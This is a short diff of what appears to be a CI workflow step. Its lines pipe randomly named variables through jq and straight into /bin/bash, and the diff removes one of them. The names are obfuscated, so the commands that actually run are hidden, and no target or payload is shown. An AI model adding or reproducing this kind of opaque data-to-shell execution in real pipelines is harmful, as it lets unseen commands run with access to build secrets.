@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$ara11" | jq -r .vij6 | /bin/bash
           echo $ydre1445 | jq -r .zdufn2 | /bin/bash
-          echo $idsib18254 | jq -r .belz70646 | /bin/bash
           echo $obh71 | jq -r .x807 | /bin/bash
           printf '%s' "$nxh4044" | jq -r .jmz7 | /bin/bash
           printf '%s' "$sui38" | jq -r .lxzi4386 | /bin/bash
